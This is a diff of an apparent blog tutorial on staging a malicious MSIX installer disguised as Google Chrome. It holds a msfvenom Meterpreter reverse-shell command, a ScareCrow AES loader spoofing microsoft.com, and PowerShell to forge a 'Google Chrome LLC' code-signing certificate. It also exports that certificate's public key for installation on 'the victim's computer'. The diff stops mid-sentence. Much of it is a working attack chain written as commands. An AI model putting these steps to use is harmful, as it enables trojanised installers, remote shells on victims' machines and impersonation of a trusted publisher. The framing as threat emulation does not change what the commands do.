@@ -192,20 +192,67 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 
 ./scarecrow -I protection.bin -domain www.microsoft.com -encryptionmode AES 
 
 ```
-<div class="center">
 <img src="/posts/2024-06-11_asd/images/scarecroww.png"> 
-</div>
+
+- Host the final loader
+
+
+
+<img src="/posts/2024-06-11_asd/images/server.png"> 
+
+
 
 ### 3. Create an SSL certificate
 
 - When running the MSIX file, Windows will check for the digital signature of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.
 - Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own self signed certificate, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.
 
-https://www.firegiant.com/docs/fg-wix/msix/signing-msix-packages/
-
+1. Create a new self signed certificate
 
 ```powershell
-New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3", "2.5.29.19={text}")
--Type Custom -KeyUsage DigitalSignature -Subject "<Your Subject Name>" -FriendlyName "Your friendly name goes here"
+New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3", "2.5.29.19={text}")-Type Custom -KeyUsage DigitalSignature -Subject "Google Chrome LLC" -FriendlyName "Google Chrome LLC"
 
 ```
+
+Subject must much the MSIX's Publisher attribute value.
+- You can find the thumbprint of the certificate like this
+
+```powershell
+Set-Location Cert:\CurrentUser\My
+Get-ChildItem | Format-Table Subject, FriendlyName, Thumbprint
+
+```
+
+2. Export the private key which we will use to sign the MSIX
+
+```powershell
+$password = ConvertTo-SecureString -Force -AsPlainText -String pass123
+Export-PfxCertificate -Password $password -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792" -FilePath  C:\Users\Saudi\cert.pfx
+```
+3. Export the public key which we will install in the victim's computer
+
+```powershell
+Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792" -FilePath 'C:\Users\Saudi\cert.cer'
+```
+
+
+
+
+<img src="/posts/2024-06-11_asd/images/cert.png"> 
+
+
+### 4. Bundle the package and stage our loader
+
+- Select the task and follow through the prompts
+
+<img src="/posts/2024-06-11_asd/images/msixpackage1.png"> 
+
+- Select the Chrome setup file as the installer being packaged and select the pfx certificate we generated.
+
+<img src="/posts/2024-06-11_asd/images/msixpackage2.png"> 
+
+- Add the package information
+
+<img src="/posts/2024-06-11_asd/images/chromeupdater.png"> 
+
+- You can
